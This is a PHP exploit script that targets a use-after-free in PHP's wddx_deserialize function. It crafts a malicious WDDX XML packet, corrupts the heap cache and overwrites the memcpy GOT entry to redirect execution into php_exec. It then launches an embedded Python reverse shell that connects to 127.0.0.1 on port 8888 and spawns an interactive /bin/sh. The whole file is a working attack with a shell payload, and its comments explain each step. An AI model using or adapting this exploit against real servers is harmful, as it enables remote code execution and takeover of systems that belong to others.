<?php
function unpack8($addr,$debug=false)
{
	$new_addr = 0;
	for($i = 0; $i < strlen($addr); $i++){
		if($debug === true)
			echo ord($addr[$i])." ".(ord($addr[$i]) << $i*8)."\n";
		$new_addr |= ord($addr[$i]) << $i*8;
	}
	return $new_addr;
}
function pack8($addr)
{
	return pack("LL", $addr & 0xffffffff, $addr >> 32);
}
function exploit()
{
	global $g,$t; // avoid php atomatic free my corrupted chunk when exploit function exit
	$xml = <<<EOF
<?xml version='1.0' ?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
	<array>
		<binary>HERE</binary>
		<var name='UUAF'></var>
		<boolean value='X'/> 
	</array>
</wddxPacket>
EOF;
	$back_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);";
	$back_shell.= "s.connect((\"127.0.0.1\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);";
	$back_shell.= "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
	$g = null;
	
	$value_victim = base64_encode(pack8(0x6e8395).str_repeat("P",1));
	$addr_victim =pack8(0x105a198 - 0x10); # overwrite heap->cache[0] = l;
	$xml = str_replace("HERE",$value_victim,$xml);
	#$xml = str_replace("REPLACE",base64_encode(str_repeat("Z",64)),$xml);
	$wddx = wddx_deserialize($xml); // trigger use after free
	foreach($wddx as $k => $v){
		$k = "";
		$k .= $addr_victim; // $k now point to free_chunk, then overwrite .free_chunk->prev = my addr
		
		$t = (string)$v; // then may heap->cache[0] = my_addr
		// make emalloc() return own $write_addr
		$g = (string)$v; // overwrite memcpy@got pointer, point into this code
		// 0x61de65 <php_exec_ex+341>:	mov    rcx,rbx
		// 0x61de68 <php_exec_ex+344>:	xor    edx,edx
		// 0x61de6a <php_exec_ex+346>:	mov    edi,ebp
		// 0x61de6c <php_exec_ex+348>:	call   0x61d9a0 <php_exec>
		// when concat_function is called, then it reach memcpy $back_shell to new buffer
		// and now we have rsi point to $back_shell, and php_exec will do the rest for us :D
		$c = $back_shell.$t; // trigger shell
		break;
	}
}
exploit()
?>